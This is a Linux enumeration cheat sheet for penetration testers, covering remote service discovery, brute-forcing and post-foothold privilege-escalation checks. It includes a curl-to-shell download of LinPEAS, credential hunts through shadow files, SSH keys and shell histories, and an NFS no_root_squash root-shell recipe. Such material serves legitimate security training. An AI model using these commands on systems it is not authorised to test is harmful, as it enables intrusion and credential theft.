Linux Enumeration - Cheat Sheet

Enumerate Linux targets from an attacker machine, and enumerate a Linux
system from the inside once you have a foothold.
Organized by goal — pick the tool that fits your situation.
Replace the placeholders (<...>) with your own values.


════════════════════════════════════════════════════════════════════
PART 1 — REMOTE ENUMERATION (from attacker machine)
════════════════════════════════════════════════════════════════════

── Host & Service Discovery ─────────────────────────────────────────

Ping sweep — find live hosts:

    nmap -sn <target-range>

Quick top-port scan across the full range:

    nmap -Pn --top-ports=100 -oA top100 <target-range>

Full service + version scan on confirmed hosts:

    nmap -Pn -sCV -oA <output-name> -iL hosts_ips.txt -v

    -sC   default NSE scripts
    -sV   version detection
    -iL   read targets from file
    -v    verbose


── OS & Version Fingerprinting ──────────────────────────────────────

    nmap -Pn -O -sV -iL hosts_ips.txt

    -O   OS fingerprinting (requires root)

Banner grabbing — quick and tool-agnostic:

    nc -nv <target> <port>
    curl -I http://<target>:<port>


── SSH Enumeration (port 22) ────────────────────────────────────────

Check supported authentication methods:

    nmap -p 22 --script=ssh-auth-methods <target>

Check supported algorithms and server version:

    nmap -p 22 --script=ssh2-enum-algos <target>

Username enumeration (CVE-2018-15473, older OpenSSH only):

    nmap -p 22 --script=ssh-enum-users \
        --script-args="userdb=<users.txt>" <target>

Try default / weak credentials:

    nmap -p 22 --script=ssh-brute \
        --script-args="userdb=<users.txt>,passdb=<wordlist-path>" <target>

    hydra -L <users.txt> -P <wordlist-path> ssh://<target>


── Web Service Enumeration (ports 80 / 443 / 8080) ──────────────────

Banner and headers:

    curl -I http://<target>
    whatweb http://<target>

Directory brute-force:

    gobuster dir -u http://<target> -w <wordlist-path> -x php,html,txt
    feroxbuster -u http://<target> -w <wordlist-path>
    dirb http://<target> <wordlist-path>

Virtual host / subdomain discovery:

    gobuster vhost -u http://<target> -w <wordlist-path>
    ffuf -w <wordlist-path> -H "Host: FUZZ.<domain>" -u http://<target>

Check for common files:

    curl http://<target>/robots.txt
    curl http://<target>/.htaccess
    curl http://<target>/sitemap.xml


── FTP Enumeration (port 21) ────────────────────────────────────────

Check for anonymous login:

    nmap -p 21 --script=ftp-anon <target>

Connect manually:

    ftp <target>       # try username: anonymous, password: (blank or email)

List files if anonymous works:

    nmap -p 21 --script=ftp-ls <target>


── NFS Enumeration (port 2049) ──────────────────────────────────────

List exported shares (no credentials needed):

    showmount -e <target>
    nmap -p 2049 --script=nfs-showmount <target>

Mount a share and browse:

    mount -t nfs <target>:/<share> /mnt/nfs -o nolock
    ls -la /mnt/nfs

    Danger flag: no_root_squash in exports means files you write as root
    on your machine will be owned by root on the target.


── SNMP Enumeration (port 161 UDP) ──────────────────────────────────

Discover hosts with SNMP open:

    onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <target-range>

Enumerate with a known community string:

    snmpwalk -v2c -c <community-string> <target>
    snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.4.2.1.2   # running processes
    snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.6.3.1.2   # installed software
    snmpwalk -v2c -c public <target> 1.3.6.1.2.1.6.13.1.3     # open TCP ports

    Default community strings to try: public, private, manager


── SMTP Enumeration (port 25) ───────────────────────────────────────

Check for user enumeration via VRFY / EXPN:

    nmap -p 25 --script=smtp-enum-users \
        --script-args="userdb=<users.txt>" <target>

Manual check:

    nc -nv <target> 25
    VRFY root
    EXPN postmaster


════════════════════════════════════════════════════════════════════
PART 2 — LOCAL ENUMERATION (post-foothold on a Linux box)
════════════════════════════════════════════════════════════════════

Run these after landing a shell. Goal: find a path to root.


── Automated Tools (run these first) ────────────────────────────────

LinPEAS — most comprehensive, color-coded output:

    curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
    # or transfer and run:
    chmod +x linpeas.sh && ./linpeas.sh | tee linpeas_output.txt

Linux Smart Enumeration (LSE):

    chmod +x lse.sh && ./lse.sh -l 1    # level 1 = interesting finds only
                       ./lse.sh -l 2    # level 2 = everything

LinEnum:

    chmod +x LinEnum.sh && ./LinEnum.sh


── System Information ───────────────────────────────────────────────

    uname -a                       # kernel version + architecture
    cat /etc/os-release            # distro name and version
    cat /proc/version              # kernel build info
    hostname                       # machine name
    env                            # environment variables
    echo $PATH                     # check for writable dirs in PATH


── User & Group Enumeration ─────────────────────────────────────────

    id                             # current user, groups
    whoami
    cat /etc/passwd                # all local users (look for home dirs, shells)
    cat /etc/group                 # all groups
    cat /etc/shadow                # password hashes (requires root)
    who                            # logged-in users
    last                           # login history
    w                              # who is logged in and what they are doing

    Users with shells (potential targets):
        grep -v '/nologin\|/false' /etc/passwd


── Sudo Permissions ─────────────────────────────────────────────────

    sudo -l                        # what can the current user run as root?

    Look for:
      (ALL) NOPASSWD: /usr/bin/<anything>   — run as root without password
      (ALL) ALL                             — full root access
      env_keep+=LD_PRELOAD or env_keep+=PYTHONPATH — environment exploits

    Check https://gtfobins.github.io for every binary listed.


── SUID / SGID Binaries ─────────────────────────────────────────────

Files that run with owner's privileges regardless of who executes them:

    find / -perm -4000 -type f 2>/dev/null     # SUID
    find / -perm -2000 -type f 2>/dev/null     # SGID
    find / -perm -6000 -type f 2>/dev/null     # both

    Compare against: https://gtfobins.github.io
    Known dangerous: bash, python, vim, find, cp, nmap, perl, ruby, tar


── Capabilities ─────────────────────────────────────────────────────

Capabilities grant partial root powers to binaries:

    getcap -r / 2>/dev/null

    Dangerous capabilities:
      cap_setuid+ep    — can set UID to 0 (root)
      cap_net_raw+ep   — raw socket access
      cap_dac_override — bypass file permission checks


── Cron Jobs ────────────────────────────────────────────────────────

    crontab -l                     # current user's cron jobs
    cat /etc/crontab               # system-wide cron
    ls -la /etc/cron.*             # cron.d, cron.daily, cron.hourly etc.
    cat /var/spool/cron/crontabs/* # all users' crontabs (may need root)

    Watch for running processes (catches cron jobs not visible in files):
        pspy64    # download from github.com/DominicBreuker/pspy


── Network Information ──────────────────────────────────────────────

    ip a                           # network interfaces and IPs
    ip route                       # routing table
    ss -tulpn                      # open ports + listening services
    netstat -tulpn                 # same (older systems)
    cat /etc/hosts                 # static hostname mappings
    cat /etc/resolv.conf           # DNS servers
    arp -a                         # ARP cache — other hosts on the network


── Running Processes ────────────────────────────────────────────────

    ps aux                         # all running processes with owners
    ps aux | grep root             # processes running as root
    pspy64                         # monitor new processes without root


── Installed Software & Versions ────────────────────────────────────

    dpkg -l                        # Debian/Ubuntu packages
    rpm -qa                        # Red Hat/CentOS packages
    which python python3 perl ruby nc wget curl 2>/dev/null
    find / -name "*.py" -o -name "*.pl" 2>/dev/null | head -20


── Writable Files & Directories ─────────────────────────────────────

World-writable directories (drop scripts here for cron pickup):

    find / -writable -type d 2>/dev/null

World-writable files (targets for injection):

    find / -writable -type f 2>/dev/null | grep -v proc

Check if /etc/passwd is writable (instant root if so):

    ls -la /etc/passwd


── Interesting Files & Credentials ──────────────────────────────────

Config files that often contain credentials:

    find / -name "*.conf" -o -name "*.config" -o -name "*.cnf" 2>/dev/null
    find / -name "wp-config.php" -o -name "config.php" 2>/dev/null
    find / -name ".env" 2>/dev/null
    find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null   # SSH private keys

Shell history — often contains passwords typed as arguments:

    cat ~/.bash_history
    cat ~/.zsh_history
    cat /home/*/.bash_history 2>/dev/null

Database credentials:

    find / -name "*.db" -o -name "*.sqlite" 2>/dev/null
    grep -r "password" /var/www/ 2>/dev/null

SSH authorized keys:

    cat ~/.ssh/authorized_keys
    cat /home/*/.ssh/authorized_keys 2>/dev/null
    cat /root/.ssh/authorized_keys 2>/dev/null


── NFS with no_root_squash ──────────────────────────────────────────

If the target exports a share with no_root_squash, files you create
as root on your attacker machine will be owned by root on the target:

    # On attacker (as root):
    showmount -e <target>
    mount -t nfs <target>:/<share> /mnt/nfs -o nolock
    cp /bin/bash /mnt/nfs/bash
    chmod +s /mnt/nfs/bash    # set SUID bit

    # On target:
    /tmp/bash -p              # get root shell


── Docker / Container Detection ─────────────────────────────────────

Check if you are inside a container:

    cat /proc/1/cgroup | grep docker
    ls /.dockerenv
    cat /proc/self/status | grep CapEff   # high value = privileged container

If Docker is accessible:

    docker ps
    docker images
    id | grep docker              # if in docker group → root via: docker run -v /:/mnt ...


════════════════════════════════════════════════════════════════════
RECOMMENDED WORKFLOW
════════════════════════════════════════════════════════════════════

Remote (no foothold):
  nmap sweep → full service scan → check for SSH, FTP, NFS, SNMP, web
  → anonymous access → version-based CVE lookup

Local (post-foothold):
  sudo -l → SUID/SGID binaries → capabilities → cron jobs
  → writable files → shell history → config files → linpeas

Key ideas:
- Always run linpeas first locally — it covers 90% of the checks automatically.
- sudo -l is the single most important command after landing a shell.
- Check GTFOBins for every binary found in sudo, SUID, or capabilities output.
- Shell history and .env files are the most common source of plaintext creds.
- pspy lets you see cron jobs and other processes without root access.
